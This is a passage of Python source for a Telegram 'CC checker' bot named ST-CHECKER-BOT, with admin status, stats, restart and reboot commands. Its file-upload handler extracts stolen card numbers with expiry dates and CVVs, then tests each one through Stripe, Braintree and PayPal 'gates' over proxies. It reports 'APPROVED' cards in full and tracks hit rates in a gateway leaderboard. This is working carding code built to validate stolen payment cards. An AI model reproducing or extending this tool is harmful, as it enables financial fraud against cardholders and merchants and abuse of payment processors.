                "region":   d.get("region", "—"),
                "country":  d.get("country", "—"),
                "isp":      conn.get("isp") or conn.get("org") or "—",
                "org":      conn.get("org", "—"),
                "flag":     flag,
                "lat":      d.get("latitude", "—"),
                "lon":      d.get("longitude", "—"),
                "timezone": tz.get("id", "—"),
                "asn":      conn.get("asn", "—"),
            }
    except Exception:
        pass

    # ── Fallback 1: ipinfo.io ─────────────────────────────────────
    try:
        r = requests.get(f"https://ipinfo.io/{_ip}/json", timeout=6)
        d = r.json()
        loc  = d.get("loc", "?,?").split(",")
        org  = d.get("org", "—")
        isp  = org.split(" ", 1)[1] if " " in org else org
        code = d.get("country", "")
        return {
            "city":     d.get("city", "—"),
            "region":   d.get("region", "—"),
            "country":  d.get("country", "—"),
            "isp":      isp,
            "org":      org,
            "flag":     _flag(code),
            "lat":      loc[0] if len(loc) > 0 else "—",
            "lon":      loc[1] if len(loc) > 1 else "—",
            "timezone": d.get("timezone", "—"),
            "asn":      "—",
        }
    except Exception:
        pass

    # ── Fallback 2: ip-api.com (HTTP) ─────────────────────────────
    try:
        r = requests.get(f"http://ip-api.com/json/{_ip}", timeout=6)
        d = r.json()
        if d.get("status") == "success":
            return {
                "city":     d.get("city", "—"),
                "region":   d.get("regionName", "—"),
                "country":  d.get("country", "—"),
                "isp":      d.get("isp", "—"),
                "org":      d.get("org", "—"),
                "flag":     _flag(d.get("countryCode", "")),
                "lat":      d.get("lat", "—"),
                "lon":      d.get("lon", "—"),
                "timezone": d.get("timezone", "—"),
                "asn":      "—",
            }
    except Exception:
        pass

    return {"city": "—", "region": "—", "country": "—", "isp": "—", "org": "—",
            "flag": "🌐", "lat": "—", "lon": "—", "timezone": "—", "asn": "—"}

def _get_ping_ms(host="api.telegram.org"):
    """Ping host and return latency in ms."""
    try:
        t = time.time()
        requests.get(f"https://{host}", timeout=5)
        return round((time.time() - t) * 1000)
    except Exception:
        return "N/A"

def _get_cpu_pct():
    """Best-effort CPU usage from /proc/stat."""
    try:
        def _read():
            with open('/proc/stat') as f:
                line = f.readline()
            vals = list(map(int, line.split()[1:]))
            idle  = vals[3]
            total = sum(vals)
            return idle, total
        i1, t1 = _read()
        time.sleep(0.15)
        i2, t2 = _read()
        diff_idle  = i2 - i1
        diff_total = t2 - t1
        pct = (1 - diff_idle / diff_total) * 100 if diff_total else 0
        return f"{pct:.1f}%"
    except Exception:
        return "N/A"

def _get_ram_info():
    """Read RAM info from /proc/meminfo (Linux/Replit)."""
    try:
        mem = {}
        with open('/proc/meminfo', 'r') as f:
            for line in f:
                parts = line.split()
                if len(parts) >= 2:
                    mem[parts[0].rstrip(':')] = int(parts[1])
        total_kb  = mem.get('MemTotal', 0)
        avail_kb  = mem.get('MemAvailable', mem.get('MemFree', 0))
        used_kb   = total_kb - avail_kb
        total_mb  = total_kb / 1024
        used_mb   = used_kb  / 1024
        free_mb   = avail_kb / 1024
        pct       = (used_kb / total_kb * 100) if total_kb else 0
        bar_filled = int(pct / 10)
        bar = "█" * bar_filled + "░" * (10 - bar_filled)
        return (f"{used_mb:.0f}MB / {total_mb:.0f}MB  [{bar}] {pct:.1f}%\n"
                f"     Free: {free_mb:.0f}MB")
    except Exception:
        return "N/A"

def _get_disk_info():
    """Read disk usage using shutil."""
    try:
        usage = shutil.disk_usage('/')
        total_gb = usage.total / (1024**3)
        used_gb  = usage.used  / (1024**3)
        free_gb  = usage.free  / (1024**3)
        pct      = usage.used / usage.total * 100
        bar_filled = int(pct / 10)
        bar = "█" * bar_filled + "░" * (10 - bar_filled)
        return (f"{used_gb:.1f}GB / {total_gb:.1f}GB  [{bar}] {pct:.1f}%\n"
                f"     Free: {free_gb:.1f}GB")
    except Exception:
        return "N/A"

@bot.message_handler(commands=["status"])
def status_command(message):
    uid = message.from_user.id
    if uid != admin:
        bot.reply_to(message, "<b>❌ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱\n\n🔐 This command is restricted to admins only.</b>", parse_mode='HTML')
        return
    log_command(message, query_type='command')

    wait_msg = bot.reply_to(message, "<b>⚙️ Fetching server status...</b>", parse_mode='HTML')

    uptime_secs = int(time.time() - BOT_START_TIME)
    hours   = uptime_secs // 3600
    minutes = (uptime_secs % 3600) // 60
    seconds = uptime_secs % 60

    now_str  = datetime.now().strftime("%d %b %Y • %H:%M:%S")
    pub_ip   = _get_public_ip()
    loc      = _get_location_info(pub_ip)
    ping_tg  = _get_ping_ms("api.telegram.org")
    ping_gw  = _get_ping_ms("stripe.com")
    cpu      = _get_cpu_pct()
    ram      = _get_ram_info()
    disk     = _get_disk_info()

    ping_tg_str = f"{ping_tg}ms" if isinstance(ping_tg, int) else ping_tg
    ping_gw_str = f"{ping_gw}ms" if isinstance(ping_gw, int) else ping_gw

    uptime_bar_filled = min(int((uptime_secs % 3600) / 360), 10)
    uptime_bar = "▰" * uptime_bar_filled + "▱" * (10 - uptime_bar_filled)

    ping_tg_icon = "🟢" if isinstance(ping_tg, int) and ping_tg < 200 else ("🟡" if isinstance(ping_tg, int) and ping_tg < 600 else "🔴")
    ping_gw_icon = "🟢" if isinstance(ping_gw, int) and ping_gw < 300 else ("🟡" if isinstance(ping_gw, int) and ping_gw < 700 else "🔴")

    text = (
        "<b>"
        "╔══〔 ⚡ 𝗦𝗘𝗥𝗩𝗘𝗥 𝗦𝗧𝗔𝗧𝗨𝗦 ⚡ 〕══╗\n"
        "\n"
        "❖  𝗕𝗢𝗧 𝗜𝗡𝗙𝗢\n"
        "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
        f"   🟢  Status    ⟫  Online & Active\n"
        f"   ⏱   Uptime    ⟫  {hours:02d}h {minutes:02d}m {seconds:02d}s\n"
        f"   📅  Date      ⟫  {now_str}\n"
        f"   📡  Mode      ⟫  Long Polling\n"
        "\n"
        f"❖  𝗡𝗘𝗧𝗪𝗢𝗥𝗞 𝗜𝗡𝗙𝗢  {loc['flag']}\n"
        "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
        f"   🔌  IP        ⟫  <code>{pub_ip}</code>\n"
        f"   🏙  City      ⟫  {loc['city']}, {loc['region']}\n"
        f"   🌍  Country   ⟫  {loc['country']}\n"
        f"   🏢  ISP       ⟫  {loc['isp']}\n"
        f"   🏛  Org       ⟫  {loc['org']}\n"
        f"   🕐  Timezone  ⟫  {loc['timezone']}\n"
        f"   📍  Coords    ⟫  {loc['lat']}, {loc['lon']}\n"
        "\n"
        "❖  𝗣𝗜𝗡𝗚 / 𝗟𝗔𝗧𝗘𝗡𝗖𝗬\n"
        "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
        f"   {ping_tg_icon}  Telegram  ⟫  {ping_tg_str}\n"
        f"   {ping_gw_icon}  Stripe    ⟫  {ping_gw_str}\n"
        "\n"
        "❖  𝗛𝗔𝗥𝗗𝗪𝗔𝗥𝗘\n"
        "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
        f"   🧠  CPU       ⟫  {cpu}\n"
        f"   💾  RAM       ⟫  {ram}\n"
        f"   🗄   Disk      ⟫  {disk}\n"
        "\n"
        f"   ▰▰▰▰ {uptime_bar} ▰▰▰▰\n"
        "╚════════════════════════╝"
        "</b>"
    )
    try:
        bot.edit_message_text(chat_id=message.chat.id, message_id=wait_msg.message_id,
                              text=text, parse_mode='HTML')
    except Exception:
        bot.reply_to(message, text, parse_mode='HTML')


@bot.message_handler(commands=["stats"])
def stats_command(message):
    uid = message.from_user.id
    if uid != admin:
        bot.reply_to(message, "<b>❌ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱\n\n🔐 This command is restricted to admins only.</b>", parse_mode='HTML')
        return
    log_command(message, query_type='command')

    total_users   = db.get_user_count()
    total_cmds    = db.get_all_queries_count()
    total_checks  = db.get_card_checks_count()
    today         = db.get_today_stats()
    gw_stats      = db.get_gateway_stats()

    uptime_secs = int(time.time() - BOT_START_TIME)
    hours   = uptime_secs // 3600
    minutes = (uptime_secs % 3600) // 60
    seconds = uptime_secs % 60
    now_str = datetime.now().strftime("%d %b %Y • %H:%M:%S")

    approved_today = today.get('approved', 0)
    checks_today   = today.get('checks', 0)
    hit_rate = f"{(approved_today/checks_today*100):.1f}%" if checks_today else "—"

    # ── Hit rate bar ──
    hr_pct = (approved_today / checks_today * 100) if checks_today else 0
    hr_filled = int(hr_pct / 10)
    hr_bar = "█" * hr_filled + "░" * (10 - hr_filled)

    # ── Gateway leaderboard ──
    gw_icons = ["🥇", "🥈", "🥉", "🏅"]
    gw_lines = ""
    for i, (gw, total, approved) in enumerate(gw_stats[:4]):
        gw_label = (gw or "Unknown")[:13]
        icon = gw_icons[i] if i < len(gw_icons) else "▪"
        gw_rate = f"{(approved/total*100):.0f}%" if total else "0%"
        gw_lines += f"   {icon}  {gw_label:<13} ⟫  {total} · ✅{approved} · {gw_rate}\n"
    if not gw_lines:
        gw_lines = "   ▪  No gateway data yet\n"

    text = (
        "<b>"
        "╔══〔 📊 𝗕𝗢𝗧 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦 📊 〕══╗\n"
        "\n"
        "❖  𝗔𝗟𝗟 𝗧𝗜𝗠𝗘\n"
        "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
        f"   👤  Users      ⟫  {total_users}\n"
        f"   ⌨️   Commands   ⟫  {total_cmds}\n"
        f"   💳  CC Checks  ⟫  {total_checks}\n"
        "\n"
        "❖  𝗧𝗢𝗗𝗔𝗬\n"
        "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
        f"   🟣  Active     ⟫  {today.get('active_users', 0)} users\n"
        f"   ⌨️   Commands   ⟫  {today.get('queries', 0)}\n"
        f"   💳  Checks     ⟫  {checks_today}\n"
        f"   ✅  Approved   ⟫  {approved_today}\n"
        f"   🎯  Hit Rate   ⟫  {hit_rate}  [{hr_bar}]\n"
        "\n"
        "❖  𝗚𝗔𝗧𝗘𝗪𝗔𝗬 𝗟𝗘𝗔𝗗𝗘𝗥𝗕𝗢𝗔𝗥𝗗\n"
        "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
        + gw_lines +
        "\n"
        "❖  𝗨𝗣𝗧𝗜𝗠𝗘\n"
        "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
        f"   🕐  Running    ⟫  {hours:02d}h {minutes:02d}m {seconds:02d}s\n"
        f"   📅  As of      ⟫  {now_str}\n"
        "\n"
        "╚════════════════════════╝"
        "</b>"
    )
    bot.reply_to(message, text, parse_mode='HTML')


@bot.message_handler(commands=["restart"])
def restart_command(message):
    uid = message.from_user.id
    if uid != admin:
        bot.reply_to(message, "<b>❌ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱\n\n🔐 Sirf admin use kar sakta hai.</b>", parse_mode='HTML')
        return
    kb = types.InlineKeyboardMarkup()
    kb.row(
        types.InlineKeyboardButton("✅ 𝗬𝗲𝘀, 𝗥𝗲𝘀𝘁𝗮𝗿𝘁", callback_data="confirm_restart"),
        types.InlineKeyboardButton("❌ 𝗖𝗮𝗻𝗰𝗲𝗹",          callback_data="cancel_restart"),
    )
    bot.reply_to(message,
        "<b>⚠️ 𝗕𝗢𝗧 𝗥𝗘𝗦𝗧𝗔𝗥𝗧\n\n"
        "🔄 Bot service restart hogi.\n"
        "⏳ ~5-10 seconds downtime.\n\n"
        "Confirm karo?</b>",
        reply_markup=kb, parse_mode='HTML'
    )

@bot.message_handler(commands=["reboot"])
def reboot_command(message):
    uid = message.from_user.id
    if uid != admin:
        bot.reply_to(message, "<b>❌ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱\n\n🔐 Sirf admin use kar sakta hai.</b>", parse_mode='HTML')
        return
    kb = types.InlineKeyboardMarkup()
    kb.row(
        types.InlineKeyboardButton("✅ 𝗬𝗲𝘀, 𝗥𝗲𝗯𝗼𝗼𝘁", callback_data="confirm_reboot"),
        types.InlineKeyboardButton("❌ 𝗖𝗮𝗻𝗰𝗲𝗹",        callback_data="cancel_reboot"),
    )
    bot.reply_to(message,
        "<b>⚠️ 𝗘𝗖𝟮 𝗥𝗘𝗕𝗢𝗢𝗧\n\n"
        "🖥️ Pura AWS EC2 server reboot hoga.\n"
        "⏳ ~60-90 seconds downtime.\n"
        "🔁 Bot auto-start hoga (systemd).\n\n"
        "Confirm karo?</b>",
        reply_markup=kb, parse_mode='HTML'
    )

@bot.callback_query_handler(func=lambda c: c.data in ("confirm_restart", "cancel_restart",
                                                        "confirm_reboot",  "cancel_reboot"))
def handle_restart_reboot(call):
    uid = call.from_user.id
    if uid != admin:
        bot.answer_callback_query(call.id, "❌ Access Denied")
        return

    data = call.data

    if data == "cancel_restart":
        bot.edit_message_text("<b>❌ Restart cancelled.</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML')
        bot.answer_callback_query(call.id, "Cancelled")
        return

    if data == "cancel_reboot":
        bot.edit_message_text("<b>❌ Reboot cancelled.</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML')
        bot.answer_callback_query(call.id, "Cancelled")
        return

    if data == "confirm_restart":
        bot.edit_message_text(
            "<b>🔄 𝗥𝗘𝗦𝗧𝗔𝗥𝗧𝗜𝗡𝗚 𝗕𝗢𝗧...\n\n"
            "⏳ ~5-10 seconds downtime.\n"
            "✅ Bot will be back shortly.</b>",
            call.message.chat.id, call.message.message_id, parse_mode='HTML'
        )
        bot.answer_callback_query(call.id, "🔄 Restarting bot...")
        def do_restart():
            time.sleep(2)
            import subprocess
            subprocess.Popen(["sudo", "systemctl", "restart", "st-checker-bot"])
        threading.Thread(target=do_restart, daemon=True).start()
        return

    if data == "confirm_reboot":
        bot.edit_message_text(
            "<b>🖥️ 𝗥𝗘𝗕𝗢𝗢𝗧𝗜𝗡𝗚 𝗘𝗖𝟮 𝗦𝗘𝗥𝗩𝗘𝗥...\n\n"
            "⏳ ~60-90 seconds downtime.\n"
            "🔁 Bot auto-start hoga (systemd).\n"
            "✅ Thodi der baad bot wapis aa jayega.</b>",
            call.message.chat.id, call.message.message_id, parse_mode='HTML'
        )
        bot.answer_callback_query(call.id, "🖥️ Rebooting EC2...")
        def do_reboot():
            time.sleep(2)
            import subprocess
            subprocess.Popen(["sudo", "reboot"])
        threading.Thread(target=do_reboot, daemon=True).start()
        return

def auto_backup_scheduler():
    import schedule as sched_module
    sched_module.every(24).hours.do(db.backup_database)
    while True:
        sched_module.run_pending()
        time.sleep(60)

try:
    import schedule
    backup_thread = threading.Thread(target=auto_backup_scheduler, daemon=True)
    backup_thread.start()
    logger.info("Auto backup scheduler started (every 24h)")
except ImportError:
    logger.warning("schedule module not found - auto backup disabled")

print("Bot Start On ✅ ")
print(f"Admin ID: {admin}")
print("للتأكد من صلاحياتك، أرسل /amadmin")

# ── Online notification — ADMIN ONLY ─────────────────────────────────────────
# Sirf admin ko jaati hai — koi bhi user ko start notification nahi milti
try:
    import platform, datetime as _dt
    _now = _dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    _online_msg = (
        f"<b>┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  🟢  BOT IS ONLINE  🟢   ┃\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        f"💀 <b>ST-CHECKER-BOT</b> — Started!\n\n"
        f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n"
        f"⏰  Time   »  <code>{_now}</code>\n"
        f"🖥️  Host   »  <code>{platform.node()}</code>\n"
        f"📡  Status »  <b>Polling Active ✅</b>\n\n"
        f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
        f"      ⌤ YADISTAN - 🍀</b>"
    )
    bot.send_message(int(admin), _online_msg, parse_mode='HTML')  # ADMIN ONLY
    print("[BOT] Online notification sent to admin only.")
except Exception as _e:
    print(f"[BOT] Could not send online notification: {_e}")
# ─────────────────────────────────────────────────────────────────────────────

import sys
import signal

# =================== TXT File Upload Handler ===================
_pending_files = {}

@bot.message_handler(content_types=['document'])
def handle_document(message):
    def process():
        id = message.from_user.id
        try:
            with open("data.json", 'r', encoding='utf-8') as f:
                jd = json.load(f)
            BL = jd.get(str(id), {}).get('plan', '𝗙𝗥𝗘𝗘')
        except:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗩𝗜𝗣 𝗼𝗻𝗹𝘆 𝗳𝗲𝗮𝘁𝘂𝗿𝗲.</b>", parse_mode='HTML')
            return
        doc = message.document
        if not doc.file_name.lower().endswith('.txt'):
            return
        try:
            file_info = bot.get_file(doc.file_id)
            downloaded = bot.download_file(file_info.file_path)
            content = downloaded.decode('utf-8', errors='ignore')
        except Exception as e:
            bot.reply_to(message, f"<b>❌ File download failed: {e}</b>", parse_mode='HTML')
            return
        raw_lines = content.strip().split('\n')
        cc_pattern = re.compile(r'\d{13,19}[|/ ]\d{1,2}[|/ ]\d{2,4}[|/ ]\d{3,4}')
        seen = set()
        cards = []
        for line in raw_lines:
            line = line.strip()
            m = cc_pattern.search(line)
            if m:
                cc = m.group().replace('/', '|').replace(' ', '|')
                if cc not in seen:
                    seen.add(cc)
                    cards.append(cc)
        if not cards:
            bot.reply_to(message, "<b>❌ No valid cards found in file.</b>", parse_mode='HTML')
            return
        dupes = len([l for l in raw_lines if l.strip()]) - len(cards)
        _pending_files[id] = {
            'cards': cards,
            'chat_id': message.chat.id,
            'msg_id': message.message_id,
            'file_name': doc.file_name
        }
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.add(
            types.InlineKeyboardButton("⚡ Stripe Auth", callback_data='fchk_sa'),
            types.InlineKeyboardButton("💳 Stripe Charge", callback_data='fchk_st'),
        )
        kb.add(
            types.InlineKeyboardButton("🛡️ Braintree VBV", callback_data='fchk_vbv'),
            types.InlineKeyboardButton("💰 PayPal", callback_data='fchk_pp'),
        )
        kb.add(
            types.InlineKeyboardButton("🔍 Non-SK Auth", callback_data='fchk_nonsk'),
        )
        bot.reply_to(
            message,
            f"<b>📂 CC File Detected!\n\n"
            f"📄 File  : <code>{doc.file_name}</code>\n"
            f"💳 Cards : <code>{len(cards)}</code>\n"
            f"🗑️ Dupes  : <code>{max(dupes, 0)}</code>\n\n"
            f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n"
            f"⚡ Select gateway to start checking:</b>",
            parse_mode='HTML', reply_markup=kb
        )
    threading.Thread(target=process).start()


def _is_success(result, gw):
    r = result.lower()
    if gw in ('sa', 'nonsk'):
        return 'approved' in r
    elif gw == 'st':
        return 'charged' in r or 'approved' in r or 'insufficient' in r
    elif gw == 'vbv':
        return '3ds authenticate' in r or 'authenticate_successful' in r or 'attempt_successful' in r
    elif gw == 'pp':
        return 'charge' in r or 'approved' in r
    return False


def _run_file_check(call, gw):
    id = call.from_user.id
    data = _pending_files.get(id)
    if not data:
        bot.answer_callback_query(call.id, "❌ No file found. Please upload again.")
        return
    cards = data['cards']
    chat_id = data['chat_id']
    file_name = data['file_name']
    total = len(cards)
    proxy = get_proxy_dict(id)
    gw_names = {'sa': '⚡ Stripe Auth', 'st': '💳 Stripe Charge',
                'vbv': '🛡️ Braintree VBV', 'pp': '💰 PayPal', 'nonsk': '🔍 Non-SK'}
    gw_label = gw_names.get(gw, gw.upper())
    checked = success = failed = 0
    try:
        stopuser[f'{id}']['status'] = 'start'
    except:
        stopuser[f'{id}'] = {'status': 'start'}
    stop_kb = types.InlineKeyboardMarkup()
    stop_kb.add(types.InlineKeyboardButton("🛑 Stop", callback_data='stop'))
    msg = bot.send_message(
        chat_id,
        f"<b>📂 {gw_label} — File Checker\n"
        f"📄 {file_name} | 💳 {total} cards\n"
        f"⏳ Starting...</b>",
        parse_mode='HTML', reply_markup=stop_kb
    )
    def build_status():
        return (
            f"<b>📂 {gw_label} — File Checker\n"
            f"📄 {file_name}\n"
            f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
            f"📊 {checked}/{total} | ✅ {success} | ❌ {failed}\n"
            f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
            f"⌤ YADISTAN - 🍀</b>"
        )
    last_edit = [time.time()]
    for cc in cards:
        if stopuser.get(f'{id}', {}).get('status') == 'stop':
            try:
                bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id,
                                      text=build_status().replace("⌤", "🛑 Stopped | ⌤"),
                                      parse_mode='HTML')
            except:
                pass
            return
        if gw == 'sa' or gw == 'nonsk':
            result = stripe_auth(cc, proxy)
        elif gw == 'st':
            result = stripe_charge(cc, proxy)
        elif gw == 'vbv':
            result = passed_gate(cc, proxy)
        elif gw == 'pp':
            result = paypal_gate(cc, get_user_amount(id), proxy)
        else:
            result = stripe_auth(cc, proxy)
        checked += 1
        if _is_success(result, gw):
            success += 1
            try:
                bot.send_message(
                    chat_id,
                    f"<b>✅ APPROVED!\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"💳 Card   : <code>{cc}</code>\n"
                    f"📡 Result : {result}\n"
                    f"🌐 Gate   : {gw_label}\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"⌤ YADISTAN - 🍀</b>",
                    parse_mode='HTML'
                )
            except:
                pass
        else:
            failed += 1
        if time.time() - last_edit[0] > 2:
            try:
                bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id,
                                      text=build_status(), parse_mode='HTML',
                                      reply_markup=stop_kb)
                last_edit[0] = time.time()
            except:
                pass
    try:
        bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id,
                              text=build_status().replace("⌤", "✅ Done! | ⌤"),
                              parse_mode='HTML')
    except:
        pass
    del _pending_files[id]


@bot.callback_query_handler(func=lambda c: c.data.startswith('fchk_'))
def file_check_callback(call):
    gw = call.data.replace('fchk_', '')
    bot.answer_callback_query(call.id, "⚡ Starting...")
    try:
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
    except:
        pass
    threading.Thread(target=_run_file_check, args=(call, gw)).start()

# ===============================================================


def _handle_sigterm(signum, frame):
    print("[BOT] SIGTERM received — shutting down cleanly.")
    try:
        bot.stop_polling()
    except:
        pass
    sys.exit(0)

signal.signal(signal.SIGTERM, _handle_sigterm)

while True:
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=30, logger_level=None)
    except KeyboardInterrupt:
        print("[BOT] Stopped by user.")
        try:
            import datetime as _dt2
            _now2 = _dt2.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            bot.send_message(admin,
                f"<b>╔══════════════════════╗\n"
                f"║  🔴  BOT IS OFFLINE!  ║\n"
                f"╚══════════════════════╝\n\n"
                f"⛔ Bot stopped manually.\n\n"
                f"⏰ Time: <code>{_now2}</code>\n\n"
                f"[⌤] YADISTAN - 🍀</b>", parse_mode='HTML')
        except:
            pass
        sys.exit(0)
    except Exception as e:
        print(f"[BOT] Polling error: {e}. Reconnecting in 10s...")
        time.sleep(10)